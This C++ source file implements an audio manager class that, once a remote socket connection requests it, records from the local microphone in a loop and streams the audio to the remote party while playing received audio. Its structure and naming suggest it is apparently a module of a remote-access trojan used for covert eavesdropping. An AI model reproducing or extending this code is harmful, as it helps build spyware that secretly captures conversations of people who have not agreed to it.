// AudioManager.cpp: implementation of the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "AudioManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CAudioManager::CAudioManager(CClientSocket *pClient) : CManager(pClient)
{
	m_lpAudio = NULL;
	m_hWorkThread = NULL;
	m_bAudioIsWorking = FALSE;
	
	if (!Initialize())
	{
		this->Disconnect();
		return;
	}
	
	BYTE	bToken = TOKEN_AUDIO_START;
	Send(&bToken, 1);
	// Wait for remote dialog open and init
	WaitForDialogOpen();
	
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);
}

CAudioManager::~CAudioManager()
{
	InterlockedExchange((LPLONG)&m_bAudioIsWorking, FALSE);
	if (m_hWorkThread)
	{
		WaitForSingleObject(m_hWorkThread, INFINITE);
		CloseHandle(m_hWorkThread);
	}
	if (m_lpAudio)
		delete	m_lpAudio;
}

int CAudioManager::sendRecordBuffer()
{
	DWORD	dwBytes = 0;
	UINT	nSendBytes = 0;
	LPBYTE	lpBuffer = m_lpAudio->getRecordBuffer(&dwBytes);
	if (lpBuffer == NULL)
		return 0;
	LPBYTE	lpPacket = new BYTE[dwBytes + 1];
	lpPacket[0] = TOKEN_AUDIO_DATA;
	memcpy(lpPacket + 1, lpBuffer, dwBytes);

	if (dwBytes > 0)
		nSendBytes = Send(lpPacket, dwBytes + 1);
	delete[] lpPacket;

	return nSendBytes;
}

bool CAudioManager::Initialize()
{
	if (!waveInGetNumDevs())
		return false;
	
	// 正在使用中.. 防止重复使用
// 	if (m_bAudioIsWorking)
// 		return false;
	
	m_lpAudio = new CAudio;
	
	InterlockedExchange((LPLONG)&m_bAudioIsWorking, TRUE);
	return true;
}

void CAudioManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}
	m_lpAudio->playBuffer(lpBuffer, nSize);
}

DWORD WINAPI CAudioManager::WorkThread(LPVOID lparam)
{
	CAudioManager *pThis = (CAudioManager *)lparam;
	while (pThis->m_bAudioIsWorking)
		pThis->sendRecordBuffer();
	
	return -1;
}
